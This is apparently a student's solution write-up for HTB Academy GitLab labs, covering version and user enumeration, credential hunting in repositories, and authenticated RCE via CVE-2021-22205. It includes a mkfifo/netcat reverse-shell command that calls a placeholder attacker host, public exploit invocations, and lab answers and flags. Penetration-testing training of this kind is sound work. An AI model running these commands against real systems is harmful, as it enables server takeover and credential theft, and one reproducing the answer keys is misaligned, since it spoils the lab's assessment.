# 🦊 GitLab Discovery & Enumeration

> **🎯 Objective:** Discover GitLab instances, enumerate version information, and extract sensitive data from repositories including credentials and configuration files.

## Overview

GitLab is a web-based Git repository hosting tool with wiki, issue tracking, and CI/CD capabilities. Often contains **sensitive data**, **hardcoded credentials**, **SSH keys**, and **configuration files** in public/internal repositories.

---

## HTB Academy Lab Solutions

### Lab 1: Version Enumeration
**Question:** "Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?"

**Target:** `gitlab.inlanefreight.local` (add to `/etc/hosts`)

#### Setup & Access
```bash
# Add vHost to hosts file
echo "10.129.201.88 gitlab.inlanefreight.local" >> /etc/hosts

# Access GitLab instance
# URL: http://gitlab.inlanefreight.local
```

#### Version Discovery Methods
1. **Register account** (if allowed) → `/help` page shows version
2. **Public projects exploration** → `/explore` for accessible repos
3. **Low-risk version detection** techniques

**Answer:** `13.10.2`

### Lab 2: Credential Discovery
**Question:** "Find the PostgreSQL database password in the example project."

#### Repository Investigation
1. **Browse public projects** via `/explore`
2. **Check "Inlanefreight dev" project** 
3. **Search through files** for configuration data
4. **Look for database configs** - config files, environment variables
5. **Check commit history** for accidentally committed credentials

**Found in:** Configuration file or environment setup  
**Answer:** `postgres`

---

## Discovery Techniques

### 1. GitLab Detection
```bash
# Standard GitLab indicators
- /users/sign_in (login page with GitLab logo)
- /explore (public projects page)
- /help (version info - requires auth)
```

### 2. User Enumeration
```bash
# Username enumeration via registration
# Try common usernames: admin, root, administrator
# Error: "Username is already taken" = valid user
```

### 3. Repository Mining
- **Public repos** via `/explore`
- **Search functionality** for keywords
- **File exploration** for sensitive data
- **Commit history** review

---

## Common Findings

**Sensitive Data Sources:**
- 🔑 **Configuration files** (database.yml, config.php)
- 🔐 **Environment variables** (.env files)
- 🗝️ **SSH private keys** 
- 📧 **API keys and tokens**
- 🔒 **Hardcoded passwords**

**Attack Vectors:**
- **Account registration** → internal repo access
- **Credential reuse** from found passwords
- **SSH key usage** for system access
- **API abuse** with extracted tokens

---

## HTB Academy Attacking Labs

### Lab 3: User Enumeration
**Question:** "Find another valid user on the target GitLab instance."

#### Method: Automated User Enumeration
```bash
# Download GitLab user enumeration script
searchsploit -m ruby/webapps/49821.sh

# Run user enumeration
./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/SecLists/Usernames/cirt-default-usernames.txt | grep exists

# Result: [+] The username DEMO exists!
```

**Answer:** `DEMO`

### Lab 4: Authenticated RCE
**Question:** "Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in."

#### Method: CVE-2021-22205 (ExifTool RCE)
```bash
# Download RCE exploit
searchsploit -m ruby/webapps/49951.py

# Start listener
nc -nvlp 9001

# Execute RCE (requires valid account: HTBAcademy:password123)
python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP PWNPO >/tmp/f'

# In reverse shell:
cat flag_gitlab.txt
```

**Answer:** `s3cure_y0ur_Rep0s!`

---

## Attack Summary

**Vulnerabilities:**
- **User Enumeration** - Registration page validation
- **CVE-2021-22205** - Authenticated RCE via ExifTool metadata
- **Self-Registration** - Often enabled for easier access

**Attack Chain:**
1. **User enumeration** → Find valid accounts
2. **Account creation** → Register if allowed  
3. **Repository mining** → Extract credentials/data
4. **RCE exploitation** → Authenticated command execution

**💡 Pro Tip:** Always check both public repos and try to register for internal access - many GitLab instances allow open registration revealing additional sensitive repositories. 